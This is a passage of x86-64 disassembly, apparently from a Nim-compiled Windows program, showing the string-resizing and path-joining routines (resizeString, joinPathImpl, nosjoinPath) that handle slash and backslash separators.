  4045a6:	c3                   	ret

00000000004045a7 <resizeString>:
  4045a7:	57                   	push   %rdi
  4045a8:	56                   	push   %rsi
  4045a9:	53                   	push   %rbx
  4045aa:	48 83 ec 20          	sub    $0x20,%rsp
  4045ae:	48 85 c9             	test   %rcx,%rcx
  4045b1:	48 89 ce             	mov    %rcx,%rsi
  4045b4:	74 4d                	je     404603 <resizeString+0x5c>
  4045b6:	48 03 11             	add    (%rcx),%rdx
  4045b9:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4045c0:	ff ff 3f 
  4045c3:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4045c7:	48 89 d3             	mov    %rdx,%rbx
  4045ca:	48 39 ca             	cmp    %rcx,%rdx
  4045cd:	7e 43                	jle    404612 <resizeString+0x6b>
  4045cf:	e8 09 d0 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  4045d4:	48 39 c3             	cmp    %rax,%rbx
  4045d7:	48 0f 4c d8          	cmovl  %rax,%rbx
  4045db:	48 83 c6 10          	add    $0x10,%rsi
  4045df:	48 89 d9             	mov    %rbx,%rcx
  4045e2:	e8 6c fa ff ff       	call   404053 <rawNewStringNoInit>
  4045e7:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  4045eb:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4045ef:	48 89 d7             	mov    %rdx,%rdi
  4045f2:	48 89 08             	mov    %rcx,(%rax)
  4045f5:	48 ff c1             	inc    %rcx
  4045f8:	f3 a4                	rep movsb (%rsi),(%rdi)
  4045fa:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4045fe:	48 89 c6             	mov    %rax,%rsi
  404601:	eb 0f                	jmp    404612 <resizeString+0x6b>
  404603:	48 89 d1             	mov    %rdx,%rcx
  404606:	48 83 c4 20          	add    $0x20,%rsp
  40460a:	5b                   	pop    %rbx
  40460b:	5e                   	pop    %rsi
  40460c:	5f                   	pop    %rdi
  40460d:	e9 41 fa ff ff       	jmp    404053 <rawNewStringNoInit>
  404612:	48 89 f0             	mov    %rsi,%rax
  404615:	48 83 c4 20          	add    $0x20,%rsp
  404619:	5b                   	pop    %rbx
  40461a:	5e                   	pop    %rsi
  40461b:	5f                   	pop    %rdi
  40461c:	c3                   	ret

000000000040461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>:
  40461d:	41 56                	push   %r14
  40461f:	41 55                	push   %r13
  404621:	41 54                	push   %r12
  404623:	55                   	push   %rbp
  404624:	57                   	push   %rdi
  404625:	56                   	push   %rsi
  404626:	53                   	push   %rbx
  404627:	48 83 ec 60          	sub    $0x60,%rsp
  40462b:	4d 85 c0             	test   %r8,%r8
  40462e:	48 89 cb             	mov    %rcx,%rbx
  404631:	49 89 d4             	mov    %rdx,%r12
  404634:	4c 89 c6             	mov    %r8,%rsi
  404637:	74 14                	je     40464d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x30>
  404639:	49 8b 00             	mov    (%r8),%rax
  40463c:	48 85 c0             	test   %rax,%rax
  40463f:	7e 07                	jle    404648 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2b>
  404641:	41 8a 44 00 0f       	mov    0xf(%r8,%rax,1),%al
  404646:	eb 1b                	jmp    404663 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x46>
  404648:	40 b7 00             	mov    $0x0,%dil
  40464b:	75 23                	jne    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40464d:	48 8b 03             	mov    (%rbx),%rax
  404650:	31 ff                	xor    %edi,%edi
  404652:	48 85 c0             	test   %rax,%rax
  404655:	74 19                	je     404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  404657:	48 8b 10             	mov    (%rax),%rdx
  40465a:	48 85 d2             	test   %rdx,%rdx
  40465d:	7e 11                	jle    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40465f:	8a 44 10 0f          	mov    0xf(%rax,%rdx,1),%al
  404663:	3c 5c                	cmp    $0x5c,%al
  404665:	40 0f 94 c7          	sete   %dil
  404669:	3c 2f                	cmp    $0x2f,%al
  40466b:	0f 94 c2             	sete   %dl
  40466e:	09 d7                	or     %edx,%edi
  404670:	4c 8d 6c 24 48       	lea    0x48(%rsp),%r13
  404675:	31 d2                	xor    %edx,%edx
  404677:	48 89 d9             	mov    %rbx,%rcx
  40467a:	e8 42 fe ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40467f:	ba 18 00 00 00       	mov    $0x18,%edx
  404684:	4c 89 e9             	mov    %r13,%rcx
  404687:	e8 36 d3 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  40468c:	49 8b 04 24          	mov    (%r12),%rax
  404690:	48 d1 f8             	sar    $1,%rax
  404693:	48 85 c0             	test   %rax,%rax
  404696:	0f 9f 44 24 58       	setg   0x58(%rsp)
  40469b:	7e 37                	jle    4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  40469d:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  4046a2:	31 d2                	xor    %edx,%edx
  4046a4:	31 c9                	xor    %ecx,%ecx
  4046a6:	48 85 f6             	test   %rsi,%rsi
  4046a9:	49 89 c0             	mov    %rax,%r8
  4046ac:	74 03                	je     4046b1 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x94>
  4046ae:	48 8b 0e             	mov    (%rsi),%rcx
  4046b1:	48 39 c1             	cmp    %rax,%rcx
  4046b4:	7e 15                	jle    4046cb <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xae>
  4046b6:	8a 4c 06 10          	mov    0x10(%rsi,%rax,1),%cl
  4046ba:	48 ff c0             	inc    %rax
  4046bd:	80 f9 5c             	cmp    $0x5c,%cl
  4046c0:	75 04                	jne    4046c6 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa9>
  4046c2:	b2 01                	mov    $0x1,%dl
  4046c4:	eb de                	jmp    4046a4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x87>
  4046c6:	80 f9 2f             	cmp    $0x2f,%cl
  4046c9:	74 f7                	je     4046c2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa5>
  4046cb:	84 d2                	test   %dl,%dl
  4046cd:	74 05                	je     4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  4046cf:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
  4046d4:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
  4046d9:	31 c0                	xor    %eax,%eax
  4046db:	48 85 f6             	test   %rsi,%rsi
  4046de:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4046e3:	74 03                	je     4046e8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xcb>
  4046e5:	48 8b 06             	mov    (%rsi),%rax
  4046e8:	48 39 c2             	cmp    %rax,%rdx
  4046eb:	7c 11                	jl     4046fe <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xe1>
  4046ed:	48 8b 03             	mov    (%rbx),%rax
  4046f0:	48 85 c0             	test   %rax,%rax
  4046f3:	0f 85 07 02 00 00    	jne    404900 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e3>
  4046f9:	e9 08 02 00 00       	jmp    404906 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e9>
  4046fe:	49 89 f0             	mov    %rsi,%r8
  404701:	4c 89 ea             	mov    %r13,%rdx
  404704:	4c 89 f1             	mov    %r14,%rcx
  404707:	e8 10 d3 ff ff       	call   401a1c <next__am1q4dBd9cls9au5CcmkX5oA>
  40470c:	49 8b 04 24          	mov    (%r12),%rax
  404710:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
  404715:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  40471a:	49 89 c1             	mov    %rax,%r9
  40471d:	49 d1 f9             	sar    $1,%r9
  404720:	75 19                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404722:	4c 39 c5             	cmp    %r8,%rbp
  404725:	75 14                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404727:	8a 54 2e 10          	mov    0x10(%rsi,%rbp,1),%dl
  40472b:	80 fa 5c             	cmp    $0x5c,%dl
  40472e:	0f 94 c1             	sete   %cl
  404731:	80 fa 2f             	cmp    $0x2f,%dl
  404734:	0f 94 c2             	sete   %dl
  404737:	08 d1                	or     %dl,%cl
  404739:	75 1a                	jne    404755 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x138>
  40473b:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  40473f:	49 39 d0             	cmp    %rdx,%r8
  404742:	75 4c                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404744:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  404749:	75 45                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  40474b:	42 80 7c 06 10 2e    	cmpb   $0x2e,0x10(%rsi,%r8,1)
  404751:	74 62                	je     4047b5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x198>
  404753:	eb 3b                	jmp    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404755:	48 8b 0b             	mov    (%rbx),%rcx
  404758:	48 85 c9             	test   %rcx,%rcx
  40475b:	74 14                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  40475d:	48 8b 01             	mov    (%rcx),%rax
  404760:	48 85 c0             	test   %rax,%rax
  404763:	74 0c                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  404765:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404769:	3c 5c                	cmp    $0x5c,%al
  40476b:	74 19                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  40476d:	3c 2f                	cmp    $0x2f,%al
  40476f:	74 15                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  404771:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404776:	e8 4f fb ff ff       	call   4042ca <addChar>
  40477b:	48 89 d9             	mov    %rbx,%rcx
  40477e:	48 89 c2             	mov    %rax,%rdx
  404781:	e8 3c e7 ff ff       	call   402ec2 <unsureAsgnRef>
  404786:	49 83 0c 24 01       	orq    $0x1,(%r12)
  40478b:	e9 49 ff ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404790:	31 c0                	xor    %eax,%eax
  404792:	4c 39 c5             	cmp    %r8,%rbp
  404795:	75 08                	jne    40479f <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x182>
  404797:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  40479c:	0f 94 c0             	sete   %al
  40479f:	4c 39 c5             	cmp    %r8,%rbp
  4047a2:	0f 8f 31 ff ff ff    	jg     4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047a8:	84 c0                	test   %al,%al
  4047aa:	0f 85 29 ff ff ff    	jne    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047b0:	e9 d0 00 00 00       	jmp    404885 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x268>
  4047b5:	4d 85 c9             	test   %r9,%r9
  4047b8:	48 8b 0b             	mov    (%rbx),%rcx
  4047bb:	7f 0a                	jg     4047c7 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1aa>
  4047bd:	48 85 c9             	test   %rcx,%rcx
  4047c0:	75 55                	jne    404817 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1fa>
  4047c2:	e9 83 00 00 00       	jmp    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  4047c7:	45 31 c0             	xor    %r8d,%r8d
  4047ca:	48 85 c9             	test   %rcx,%rcx
  4047cd:	74 03                	je     4047d2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b5>
  4047cf:	4c 8b 01             	mov    (%rcx),%r8
  4047d2:	83 e0 01             	and    $0x1,%eax
  4047d5:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
  4047d9:	48 39 d0             	cmp    %rdx,%rax
  4047dc:	7d 16                	jge    4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047de:	44 8a 4c 11 10       	mov    0x10(%rcx,%rdx,1),%r9b
  4047e3:	41 80 f9 5c          	cmp    $0x5c,%r9b
  4047e7:	74 0b                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047e9:	41 80 f9 2f          	cmp    $0x2f,%r9b
  4047ed:	74 05                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047ef:	49 89 d0             	mov    %rdx,%r8
  4047f2:	eb e1                	jmp    4047d5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b8>
  4047f4:	4d 85 c0             	test   %r8,%r8
  4047f7:	0f 8e dc fe ff ff    	jle    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047fd:	e8 02 f9 ff ff       	call   404104 <setLengthStr>
  404802:	48 89 d9             	mov    %rbx,%rcx
  404805:	48 89 c2             	mov    %rax,%rdx
  404808:	e8 b5 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  40480d:	49 83 2c 24 02       	subq   $0x2,(%r12)
  404812:	e9 c2 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404817:	48 8b 01             	mov    (%rcx),%rax
  40481a:	48 85 c0             	test   %rax,%rax
  40481d:	7e 2b                	jle    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40481f:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404823:	3c 5c                	cmp    $0x5c,%al
  404825:	74 23                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  404827:	3c 2f                	cmp    $0x2f,%al
  404829:	74 1f                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40482b:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404830:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  404835:	e8 90 fa ff ff       	call   4042ca <addChar>
  40483a:	48 89 d9             	mov    %rbx,%rcx
  40483d:	48 89 c2             	mov    %rax,%rdx
  404840:	e8 7d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404845:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  40484a:	48 89 ea             	mov    %rbp,%rdx
  40484d:	48 89 f1             	mov    %rsi,%rcx
  404850:	e8 be f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  404855:	31 d2                	xor    %edx,%edx
  404857:	48 85 c0             	test   %rax,%rax
  40485a:	48 89 c5             	mov    %rax,%rbp
  40485d:	74 03                	je     404862 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x245>
  40485f:	48 8b 10             	mov    (%rax),%rdx
  404862:	48 8b 0b             	mov    (%rbx),%rcx
  404865:	e8 3d fd ff ff       	call   4045a7 <resizeString>
  40486a:	48 89 d9             	mov    %rbx,%rcx
  40486d:	48 89 c2             	mov    %rax,%rdx
  404870:	e8 4d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404875:	48 8b 0b             	mov    (%rbx),%rcx
  404878:	48 89 ea             	mov    %rbp,%rdx
  40487b:	e8 23 d1 ff ff       	call   4019a3 <appendString.lto_priv.48>
  404880:	e9 54 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404885:	48 8b 0b             	mov    (%rbx),%rcx
  404888:	48 85 c9             	test   %rcx,%rcx
  40488b:	74 33                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40488d:	48 8b 01             	mov    (%rcx),%rax
  404890:	48 85 c0             	test   %rax,%rax
  404893:	7e 2b                	jle    4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  404895:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404899:	3c 5c                	cmp    $0x5c,%al
  40489b:	74 23                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40489d:	3c 2f                	cmp    $0x2f,%al
  40489f:	74 1f                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  4048a1:	ba 5c 00 00 00       	mov    $0x5c,%edx
  4048a6:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  4048ab:	e8 1a fa ff ff       	call   4042ca <addChar>
  4048b0:	48 89 d9             	mov    %rbx,%rcx
  4048b3:	48 89 c2             	mov    %rax,%rdx
  4048b6:	e8 07 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  4048bb:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  4048c0:	48 89 ea             	mov    %rbp,%rdx
  4048c3:	48 89 f1             	mov    %rsi,%rcx
  4048c6:	e8 48 f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  4048cb:	31 d2                	xor    %edx,%edx
  4048cd:	48 85 c0             	test   %rax,%rax
  4048d0:	48 89 c5             	mov    %rax,%rbp
  4048d3:	74 03                	je     4048d8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2bb>
  4048d5:	48 8b 10             	mov    (%rax),%rdx
  4048d8:	48 8b 0b             	mov    (%rbx),%rcx
  4048db:	e8 c7 fc ff ff       	call   4045a7 <resizeString>
  4048e0:	48 89 d9             	mov    %rbx,%rcx
  4048e3:	48 89 c2             	mov    %rax,%rdx
  4048e6:	e8 d7 e5 ff ff       	call   402ec2 <unsureAsgnRef>
  4048eb:	48 8b 0b             	mov    (%rbx),%rcx
  4048ee:	48 89 ea             	mov    %rbp,%rdx
  4048f1:	e8 ad d0 ff ff       	call   4019a3 <appendString.lto_priv.48>
  4048f6:	49 83 04 24 02       	addq   $0x2,(%r12)
  4048fb:	e9 d9 fd ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404900:	48 83 38 00          	cmpq   $0x0,(%rax)
  404904:	75 0b                	jne    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  404906:	48 85 f6             	test   %rsi,%rsi
  404909:	74 06                	je     404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  40490b:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  40490f:	75 1c                	jne    40492d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x310>
  404911:	40 0f b6 d7          	movzbl %dil,%edx
  404915:	48 89 d9             	mov    %rbx,%rcx
  404918:	e8 a4 fb ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40491d:	90                   	nop
  40491e:	48 83 c4 60          	add    $0x60,%rsp
  404922:	5b                   	pop    %rbx
  404923:	5e                   	pop    %rsi
  404924:	5f                   	pop    %rdi
  404925:	5d                   	pop    %rbp
  404926:	41 5c                	pop    %r12
  404928:	41 5d                	pop    %r13
  40492a:	41 5e                	pop    %r14
  40492c:	c3                   	ret
  40492d:	48 8d 0d 5c ca 00 00 	lea    0xca5c(%rip),%rcx        # 411390 <TM__DfU0iuayCGwHDN1Exp9cbKg_2>
  404934:	e8 8a f7 ff ff       	call   4040c3 <copyString>
  404939:	48 89 d9             	mov    %rbx,%rcx
  40493c:	48 89 c2             	mov    %rax,%rdx
  40493f:	e8 7e e5 ff ff       	call   402ec2 <unsureAsgnRef>
  404944:	eb cb                	jmp    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>

0000000000404946 <nosjoinPath>:
  404946:	57                   	push   %rdi
  404947:	56                   	push   %rsi
  404948:	53                   	push   %rbx
  404949:	48 83 ec 30          	sub    $0x30,%rsp
  40494d:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  404954:	00 00 
  404956:	49 89 c8             	mov    %rcx,%r8
  404959:	31 c9                	xor    %ecx,%ecx
  40495b:	48 89 d7             	mov    %rdx,%rdi
  40495e:	4d 85 c0             	test   %r8,%r8
  404961:	74 03                	je     404966 <nosjoinPath+0x20>
  404963:	49 8b 08             	mov    (%r8),%rcx
  404966:	48 03 0f             	add    (%rdi),%rcx
  404969:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
  40496e:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  404973:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
  404978:	e8 cf f3 ff ff       	call   403d4c <rawNewString>
  40497d:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
  404982:	48 89 f2             	mov    %rsi,%rdx
  404985:	48 89 d9             	mov    %rbx,%rcx
